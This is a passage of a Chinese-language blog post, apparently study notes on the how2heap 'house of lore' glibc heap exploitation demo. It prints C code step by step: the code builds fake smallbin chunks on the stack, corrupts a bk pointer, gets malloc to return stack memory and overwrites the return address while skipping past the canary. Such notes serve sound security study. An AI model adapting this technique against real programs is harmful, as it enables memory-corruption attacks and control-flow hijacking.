stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//size</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> victim_chunk<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 改写 fd，绕过申请 smallbin 的检测</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 \"</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>         <span class=\"token string\">\"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake \"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>         <span class=\"token string\">\"chunk on stack\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>  stack_buffer_1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_2<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 改写 bk</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span><span class=\"token comment\">// 到这里的双链表结构 buffer2&lt;=>buffer1->victim (\"->\" 代表 fd ；\"&lt;-\" 代表 bk )</span></pre></td></tr></table></figure><p><s>【为什么没有 size 的检测？检测 size 一般在合并的时候检测】</s></p>\n<p>在栈上构造了 <code>fake_chunk</code>  的结构，修改了 buffer1 的 fd 绕过了 <code>检测</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/UP61ZJE%7DS%24BFMWZYVU641R4.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/2A0CF%28G6TY%25BDI2BJ%29HGU%5BD.png\" alt=\"\" /></p>\n<p>检测：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">__glibc_unlikely</span> <span class=\"token punctuation\">(</span>bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">!=</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>                <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>                  errstr <span class=\"token operator\">=</span> <span class=\"token string\">\"malloc(): smallbin double linked list corrupted\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                  <span class=\"token keyword\">goto</span> errout<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>              <span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>              bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>              bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>从上面看到，想要申请从 smallbin 空间就要 bck-&gt;fd=victim (相当于 buffer1-&gt;fd=victim) , 这样才能将 buffer1 给带入 smallbin 中被后续申请出去</p>\n<h3 id=\"3执行到68行\"><a class=\"anchor\" href=\"#3执行到68行\">#</a> 3. 执行到 68 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocating another large chunk in order to avoid consolidating the top chunk with\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>         <span class=\"token string\">\"the small one during the free()\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p5 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Allocated the large chunk on the heap at %p\\n\"</span><span class=\"token punctuation\">,</span> p5<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>申请一个 large chunk 为了防止紧挨着 topchunk 发生合并</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/SL8ZD13VB%25%7BB_8EGI%7DWL2EL.png\" alt=\"\" /></p>\n<h3 id=\"4执行到76行\"><a class=\"anchor\" href=\"#4执行到76行\">#</a> 4. 执行到 76 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Freeing the chunk %p, it will be inserted in the unsorted bin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">free</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted bin's header address (libc addresses)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>释放申请的 small chunk，但是它不会一开始就进入 smallbin 中，它会先进入到 unsorted bin 中直到下一次执行 malloc</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/TSR1N9Q%299W3S4PG%29A596T9E.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/P3%5BV_7Y3V%40JOTOL5R%293U5VJ.png\" alt=\"\" /></p>\n<p>看到先进入了 unsortedbin 中，并且这里只有一个 chunk 所以这个 chunk 的 fd 和 bk 都会指向 <code>main_arena</code>  的地方</p>\n<p><code>注意：</code></p>\n<p>在后面执行 malloc 的时候，会再次进行分配，下一次分配（malloc）的大小如果比它大，那么将从 <code> top chunk</code>  上分配相应大小，而该 chunk 会被取下 link 到相应的 bin 中。如果比它小 (相等则直接返回)，则从该  <code>chunk</code>  上切除相应大小，并返回相应 chunk，剩下的成为 <code> last reminder chunk</code>  , 还是存在  <code>unsorted bin</code>  中，不会放入 <code>small/large bin</code>  中。</p>\n<h3 id=\"5执行到86行\"><a class=\"anchor\" href=\"#5执行到86行\">#</a> 5. 执行到 86 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This means that the chunk %p will be inserted in front of the SmallBin\\n\"</span><span class=\"token punctuation\">,</span> victim<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p2 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">1200</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//0x4B0</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\\n\"</span><span class=\"token punctuation\">,</span> p2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"The victim chunk has been sorted and its fwd and bk pointers updated\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->fwd: %p\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//victim will be inserted in the small bin</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"victim->bk: %p\\n\\n\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span> <span class=\"token operator\">*</span><span class=\"token punctuation\">)</span>victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里申请一个 1200 大小的 <code>large chunk</code> ，而 bin 中没有 chunk 满足，就在 <code>top chunk</code>  上切割一个分配，在 <code>unsorted bin</code>  中的 chunk 就会归属到对应的 <code>small/large bin</code>  下，这里的 victim 就进入了 <code>smallbin</code>  中</p>\n<p>下面的图里可以看出进入了 <code>smal_lbin</code>  中</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/ML02%7EGGWZKEF%29%5DS8%24Q6YMWD.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/YKNM2CB6ZL9LYMDWX%7B%25W%604O.png\" alt=\"\" /></p>\n<h3 id=\"6执行到92行\"><a class=\"anchor\" href=\"#6执行到92行\">#</a> 6. 执行到 92 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now emulating a vulnerability that can overwrite the victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  victim<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>stack_buffer_1<span class=\"token punctuation\">;</span> <span class=\"token comment\">// victim->bk is pointing to stack</span></pre></td></tr></table></figure><p>这里修改了  <code>victim[1] =stack_buffer_1</code> , 所以就让 bk 指向了 buffer1 （fd 还是没有变，仍指向 <code>main_arena</code> ）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/2P0E%60ZTA%7BQQL9Z4%2972QG9B2.png\" alt=\"\" /></p>\n<h3 id=\"7执行到99行\"><a class=\"anchor\" href=\"#7执行到99行\">#</a> 7. 执行到 99 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Now allocating a chunk with size equal to the first one freed\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This should return the overwritten victim chunk and set the bin->bk to the injected victim->bk pointer\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token operator\">*</span>p3 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里将释放的 victim 从 <code>small_bin</code>  申请回去，然后根据：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">set_inuse_bit_at_offset</span> <span class=\"token punctuation\">(</span>victim<span class=\"token punctuation\">,</span> nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>              bin<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span> bck<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>              bck<span class=\"token operator\">-></span>fd <span class=\"token operator\">=</span> bin<span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>就会将 victim-&gt;bk 作为 <code>small_bin</code>  最后一个 chunk（也就是 buffer1），再申请的话就会申请到 buffer1</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/A%6062OI0%608KCM1%7E6F%401%7BZXDU.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/UX6H%7DTO71FQGG%7B%28B%7BY9W8RR.png\" alt=\"\" /></p>\n<p>这里可以发现 <code>small_bin</code>  中的 bk 已经改变了，从 buffer1 指向了 buffer2</p>\n<p>【又出来一个疑问，为什么没有修改 buffer 的 size（这里的 size 位为 0），申请的 small_chunk 不满足大小怎么办】从源码大概理解为什么：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">in_smallbin_range</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// 判断范围是否符合 `small_bin`</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>      idx <span class=\"token operator\">=</span> <span class=\"token function\">smallbin_index</span> <span class=\"token punctuation\">(</span>nb<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 判断哪个 index 符合大小，找申请的大小满足的 index</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>      bin <span class=\"token operator\">=</span> <span class=\"token function\">bin_at</span> <span class=\"token punctuation\">(</span>av<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里发现，判断了要申请的大小符合的 index，在对应的 index 里有 chunk 就直接从该 index 里取出就行，不用在判断 size 的大小，因为找到的 index 就默认了这里的 chunk 符合申请的空间大小；所以我们利用 victim 将 buffer 插入了这里，那么申请 0x100 的大小就会默认 buffer1 符合</p>\n<h3 id=\"8执行到107行\"><a class=\"anchor\" href=\"#8执行到107行\">#</a> 8. 执行到 107 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>p4 <span class=\"token operator\">=</span> <span class=\"token function\">malloc</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"p4 = malloc(0x100)\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\\n\"</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>         stack_buffer_2<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>这里将 buffer1 申请出去，因为其 bk 指向 buffer2，且 buffer2-&gt;fd 也指向了 buffer1，所以将 buffer2 也加入了 smallbin 中</p>\n<p>申请前的 buffer2：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/CV%60U8JL%7E%5DME7K%7DVHPJGOEQE.png\" alt=\"\" /></p>\n<p>申请后的 buffer2：<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/EV__2CG1H%25%5BG3R%240WJ26%5DEO.png\" alt=\"\" /></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/XF%5D2P%5DDT%40X%5DX%5B2PSY6EO%7DPJ.png\" alt=\"\" /></p>\n<h3 id=\"9执行到115行\"><a class=\"anchor\" href=\"#9执行到115行\">#</a> 9. 执行到 115 行</h3>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">fprintf</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stderr</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\\np4 is %p and should be on the stack!\\n\"</span><span class=\"token punctuation\">,</span> p4<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// this chunk will be allocated on stack</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token class-name\">intptr_t</span> sc <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">intptr_t</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Emulating our in-memory shellcode</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token keyword\">long</span> offset <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_frame_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>p4<span class=\"token punctuation\">;</span><span class=\"token comment\">//buffer 的 rbp 到 p4 的偏移</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>p4<span class=\"token operator\">+</span>offset<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>sc<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// This bypasses stack-smash detection since it jumps over the canary；将 sc 覆盖到返回地址处</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">//+8?</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token comment\">// sanity check</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token function\">assert</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span><span class=\"token function\">__builtin_return_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span><span class=\"token punctuation\">)</span>jackpot<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token comment\">//__builtin_return_address 内建函数，得到栈的 ret 地址</span></pre></td></tr></table></figure><p>这里就开始进行改写了，直接将栈上的 ret 改写，绕过了 canary 保护</p>\n<p>这里将 buffer1 的 ret 改写为 sc（也就是 jackpot 的地址），就会 ret 去执行这里导致输出 jackpot 函数的 <code>Nice jump d00d</code></p>\n<p>查看 jackpot 地址：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/S_D4M%28NMW%7B%7EX%5B8IO012T%7BDC.png\" alt=\"\" /></p>\n<p>执行 <code>memcpy((p4+offset+8), &amp;sc, 8);</code>  查看栈上：<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/how2heap/ML%5D%7E%7BM%253N%24U3%294SLV%25UR6C6.png\" alt=\"\" /></p>\n<p>执行最后的  <code>assert((long)__builtin_return_address(0) == (long)jackpot);</code>  判断成功</p>\n<p>最后会返回到 <code>jackpot</code>  输出 <code>Nice jump d00d</code></p>\n<h1 id=\"8house_of_mind_fastbin又是一个坑\"><a class=\"anchor\" href=\"#8house_of_mind_fastbin又是一个坑\">#</a> 8. <code>house_of_mind_fastbin</code> 【又是一个坑】</h1>\n<h1 id=\"9house_of_orange\"><a class=\"anchor\" href=\"#9house_of_orange\">#</a> 9. <code>house_of_orange</code></h1>\n<h2 id=\"1源码\"><a class=\"anchor\" href=\"#1源码\">#</a> 1. 源码</h2>\n<pre><code class=\"language-c\">\n\n\n</code></pre>\n",
            "tags": [
                "how2heap"
            ]
        }
    ]
}